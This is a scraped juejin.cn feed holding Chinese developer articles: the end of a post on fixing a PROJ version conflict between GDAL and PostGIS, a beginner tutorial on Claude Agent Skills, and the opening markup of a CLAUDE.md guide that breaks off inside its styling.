<p>在<code>windows</code>开发环境中同时安装<code>GDAL</code>与<code>PostGIS</code>，其中投影库<code>PROJ</code>的环境变量指向<code>PostGIS</code>的安装路径，在运行GDAL程序时，涉及到要素、几何与投影操作时会导致异常。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a705134204db4fae8dcfacacdcf4aeee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=9SQOvQEkYohBM3FANbPf1QxpRL0%3D" alt="" loading="lazy"/>具体意思为<code>GDAL</code>不支持<code>PostGIS</code>插件中的投影库版本，需要更换投影库或者升级版本。</p>
<p><code>RuntimeError: PROJ: proj_identify: D:Program FilesPostgreSQL13sharecontribpostgis-3.5projproj.db contains DATABASE.LAYOUT.VERSION.MINOR = 2 whereas a number &gt;= 5 is expected. It comes from another PROJ installation.</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67777e7136d548e891f2c6e9420a0043~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=SC%2Bb0ZDrRchoPg3ZUqYwDe6JZjs%3D" alt="" loading="lazy"/></p>
<p>解决办法为修改<code>PROJ</code>的环境变量到<code>GDAL</code>支持的版本或者在<code>GDAL</code>程序开头添加以下代码：</p>
<pre><code class="hljs language-python" lang="python">os.environ[<span class="hljs-string">'PROJ_LIB'</span>] = <span class="hljs-string">r'D:\Programs\Python\Python311\Libsite-packages\osgeo\data\proj'</span>
</code></pre>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd6c7a31e82f401abfb5c30b949ac2f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=RdHJgT6FNCq4xfmGph%2FKl31iWT4%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>❝</p>
<p>OpenLayers示例数据下载，请在公众号后台回复：<strong>ol数据</strong></p>
<p>全国信息化工程师－GIS 应用水平考试资料，请在公众号后台回复：<strong>GIS考试</strong></p>
</blockquote>
<blockquote>
<p>❝</p>
<p><em><strong>GIS之路</strong></em> 公众号已经接入了<strong>智能</strong> <strong>助手</strong>，可以在对话框进行提问，也可以直接搜索历史文章进行查看。</p>
</blockquote>
<p>都看到这了，不要忘记<em><strong>点赞、收藏</strong></em> <strong>+</strong> <em><strong>关注</strong></em> 哦 <strong>！</strong></p>
<p>本号不定时更新有关 <em><strong>GIS开发</strong></em> 相关内容，<em><strong>欢迎关注 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a5dbad0e434af9a1cceb107c8fe144~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=nGlTDtPD2wydxBh5KBWGRTnaSVs%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaa3ad7e8b764713843b5c25c1bfdd59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=9YULTarkCaa4pkfWRuC1Vfk4Dlk%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d9ad5d8238d4d238c33fcc7e0edb6bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=gjppw5tlY9Hu3sBiEsIBTwlaTz4%3D" alt="" loading="lazy"/></p>
<p>   <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3edd48e213b74d1a8eef3d95100e9807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=jw842TmadigUcfDWRDeadhyv7c4%3D" alt="" loading="lazy"/> </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools 开发合集（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers 开发合集</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FwkHv2NnJfuPhtyjJcFLrEQ" target="_blank" title="https://mp.weixin.qq.com/s/wkHv2NnJfuPhtyjJcFLrEQ" ref="nofollow noopener noreferrer">GDAL 实现矢量数据转换处理（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FMZIQ57Ka3NQfKFi9AuEQEg" target="_blank" title="https://mp.weixin.qq.com/s/MZIQ57Ka3NQfKFi9AuEQEg" ref="nofollow noopener noreferrer">GDAL 实现投影转换</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FSX2u2ww1iNOtqR5m3BE93g" target="_blank" title="https://mp.weixin.qq.com/s/SX2u2ww1iNOtqR5m3BE93g" ref="nofollow noopener noreferrer">国产版的Google Earth，吉林一号卫星App“共生地球”来了</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FfWufqSyplniNj4Q3BRRbAQ" target="_blank" title="https://mp.weixin.qq.com/s/fWufqSyplniNj4Q3BRRbAQ" ref="nofollow noopener noreferrer">2026年全国自然资源工作会议召开</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FRq7mCSrKU7DA7WRGDEy6Cg" target="_blank" title="https://mp.weixin.qq.com/s/Rq7mCSrKU7DA7WRGDEy6Cg" ref="nofollow noopener noreferrer">日本欲打造“本土版”星链系统</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FEqpOD--IdOUO6gyzwBc6RA" target="_blank" title="https://mp.weixin.qq.com/s/EqpOD--IdOUO6gyzwBc6RA" ref="nofollow noopener noreferrer">吉林一号国内首张高分辨率彩色夜光卫星影像发布</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FznfhqB1_3JbQHG7CEqWSCw" target="_blank" title="https://mp.weixin.qq.com/s/znfhqB1_3JbQHG7CEqWSCw" ref="nofollow noopener noreferrer">2025 年度信创领军企业名单出炉！</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[保姆级喂饭教程：什么是Skills？如何用Skills？]]></title>    <link>https://juejin.cn/post/7595423767721164809</link>    <guid>https://juejin.cn/post/7595423767721164809</guid>    <pubDate>2026-01-15T13:50:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767721164809" data-draft-id="7595422019778052146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="保姆级喂饭教程：什么是Skills？如何用Skills？"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-15T13:50:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java中文社群"/> <meta itemprop="url" content="https://juejin.cn/user/61228381386487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            保姆级喂饭教程：什么是Skills？如何用Skills？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228381386487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java中文社群
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:50:09.000Z" title="Thu Jan 15 2026 13:50:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近 AI 界又有一个概念火出圈了，它就是——<strong>Skills</strong>（技能）。</p>
<p>你可能在很多地方听过它的其他名字，比如 <strong>Claude Agent Skills</strong> 或者 <strong>Agent Skills</strong>，但大家最习惯的还是直接叫它 <strong>Skills</strong>。</p>
<p>很多人看了网上的技术文档表示“一脸懵逼”，完全看不懂。今天咱们就用最通俗易懂的大白话，带你拆解这个 AI 圈的新宠，看看小白用户到底该怎么上手！</p>
<hr/>
<h2 data-id="heading-0">🎬 视频演示</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1TKrfBUEQv%2F" target="_blank" title="https://www.bilibili.com/video/BV1TKrfBUEQv/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1TK…</a></p>
<hr/>
<h2 data-id="heading-1">🛠️ 到底什么是 Skills？</h2>
<p>首先，咱们来盘概念。<strong>Skills</strong> 翻译成中文就是“技能”。</p>
<p>什么叫技能？<strong>技能就是你执行某件事的方法论。</strong></p>
<blockquote>
<p>举个生活中的例子：我会打羽毛球。当球飞过来，我拿起球拍，在合适的时机、用合适的力度击球，让球准确落在对方场地，这一整套操作逻辑，就叫“技能”。</p>
</blockquote>
<p>在 AI 界，<strong>Skills 就是让大模型按照某种特定的方法论去行动的机制。</strong></p>
<blockquote>
<p>有人会说：“这不就是提示词（Prompt）吗？”</p>
</blockquote>
<p>你可以把它理解为 <strong>“超级进化版的提示词”</strong>。因为它比普通提示词强得多，通常由三部分组成：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753abf73a18c475fae4514a86a8df604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=c09BmwkmfDfmeXSeGSC0uyCTtrg%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>元数据 (Metadata)：</strong> 包含对这个技能的简短描述。它保存在全局上下文中，因为体积小，所以非常节省 <strong>Tokens</strong>（省钱又省心）。</li>
<li><strong>行动指南 (Action Guide)：</strong> 这部分才是真正的提示词，规定了 AI 每一步该怎么做。</li>
<li><strong>资源文件 (Resources)：</strong> 这是最厉害的地方！它可能包含 <strong>Python 代码</strong> 或其他执行程序，保证程序在调用 Skill 时能完成复杂的动作。</li>
</ol>
<hr/>
<h2 data-id="heading-2">🎨 举个栗子：让 AI 突破“次元壁”</h2>
<p>为什么说它是升级版？</p>
<p>比如你问 <strong>DeepSeek</strong> 或者 <strong>Claude</strong>：“帮我画一张茶壶的海报。”</p>
<p>常规的大模型由于不具备绘图引擎，它顶多只能给你写一段描述图片的文字（Prompt），没法直接甩给你一张图片，例如 DeepSeek：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e4640009f24bc09d43f21bd7bedc30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=c10748%2Bfxr1QWcjSnnPVYipfTMs%3D" alt="" loading="lazy"/></p>
<p>但有了 <strong>Skills</strong> 之后，大模型就可以直接调用“绘图 Skill”。这个 Skill 里面包含了绘图的 Python 脚本，大模型在后台跑一下代码，啪的一声，海报图片就直接生成并保存到你的文件夹里了。</p>
<p><strong>这就是 Skills 的威力：让 AI 拥有了“手”和“工具”，不再只是“纸上谈兵”。</strong></p>
<hr/>
<h2 data-id="heading-3">🚀 实战上手：手把手教你配置 Skills</h2>
<p>光说不练假把式，咱们直接看怎么用。这里我们以 <strong>Claude Code</strong> 为例。</p>
<h3 data-id="heading-4">第一步：创建目录</h3>
<p>在你的项目文件夹下，创建一个特定的目录结构：<br/>
<code>myskills/.claude/skills</code></p>
<blockquote>
<p><strong>注意：</strong> 文件夹名必须严格遵守这个格式，建议使用英文路径，避免中文乱码报错。</p>
</blockquote>
<h3 data-id="heading-5">第二步：搬运“神仙技能”</h3>
<p>现在网上有很多开源的 Skills 项目（比如 GitHub 上的优秀项目）。我们可以直接把别人写好的技能包（通常是一个文件夹，里面包含一个 <code>skill.md</code> 和一些脚本文件）下载下来，解压后直接粘贴到刚才创建的 <code>skills</code> 目录里。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1e65513f1054c59a98a6c477efd9b28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=ntqLmrQEnGwYCO8Cu4qxzGxn%2FZQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">第三步：启动与调用</h3>
<ol>
<li>打开命令行（CMD），进入你的项目目录。</li>
<li>输入命令启动 Claude。</li>
<li>你可以问它：“你现在有哪些 Skills？”</li>
</ol>
<p>这时候 AI 就会扫描目录，告诉你：“我已经加载了绘图技能、文件操作技能……”</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2e5550fa5284c499b09422b3cbab8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=9hH5aXdpp3CoF7P12pwcYZJGHhE%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">🖼️ 效果展示：一句话生成海报</h2>
<p>咱们来测试一下。在命令行输入：</p>
<blockquote>
<p>“帮我制作一个茶壶的商品海报。”</p>
</blockquote>
<p>AI 会分析你的指令，发现需要调用 <code>canvas</code>（绘图设计）这个 Skill。它会询问你是否确认执行，你按下回车，后台的 Python 脚本就开始疯狂运转。</p>
<p>片刻之后，海报直接出现在你的文件夹里！甚至连设计理念、Markdown 说明文档都给你配齐了。</p>
<hr/>
<h2 data-id="heading-8">💡 为什么你一定要学会用 Skills？</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/433ce61fe63e4eaea96212ecd0fdf494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=CRQtsS9I9svpOcbMxmQpq83svBQ%3D" alt="" loading="lazy"/></p>
<p>相比于传统的满屏堆 Prompt，Skills 有两个无法拒绝的优势：</p>
<ol>
<li><strong>全局通用，省时省力：</strong> 你可以把 Skill 设置成项目级别或全局通用。不需要每次聊天都复制一大段长长的提示词，AI 看到指令自动触发，非常丝滑。</li>
<li><strong>能力扩展，突破上限：</strong> 很多复杂任务（如处理表格、批量重命名、自动化绘图），光靠提示词是搞不定的。Skills 允许加入代码附件，极大地扩展了 AI 的能力边界。</li>
</ol>
<p><strong>总结一下：Skills 就是把“提示词”+“执行脚本”+“上下文优化”打包在一起的超级工具包。</strong></p>
<p>学会了它，你才算真正解锁了 AI Agent 的正确打开方式！</p>
<hr/>
<p><strong>我是磊哥，每天为你分享一个 AI 干货！如果你对如何编写自己的 Skill 感兴趣，欢迎点赞告诉我，后期咱们出一期详细的进阶教程！</strong></p>
<blockquote>
<p>本文已收录到我的技术小站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.javacn.site" target="_blank" title="https://www.javacn.site" ref="nofollow noopener noreferrer">www.javacn.site</a>，网站包含的内容有：<strong>N8N/Coze/Dify/LangChain/SpringAI/SpringAIAlibaba/LangChain4j/AI实战项目/AI常见面试题</strong>等技术分享，欢迎各位大佬光临指导~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CLAUDE.md 全方位指南：构建高效 AI 开发上下文]]></title>    <link>https://juejin.cn/post/7595414148487069736</link>    <guid>https://juejin.cn/post/7595414148487069736</guid>    <pubDate>2026-01-15T12:11:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595414148487069736" data-draft-id="7595400254347509775" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CLAUDE.md 全方位指南：构建高效 AI 开发上下文"/> <meta itemprop="keywords" content="Claude,VibeCoding"/> <meta itemprop="datePublished" content="2026-01-15T12:11:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序猿DD"/> <meta itemprop="url" content="https://juejin.cn/user/131597123993358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CLAUDE.md 全方位指南：构建高效 AI 开发上下文
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597123993358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序猿DD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:11:53.000Z" title="Thu Jan 15 2026 12:11:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" 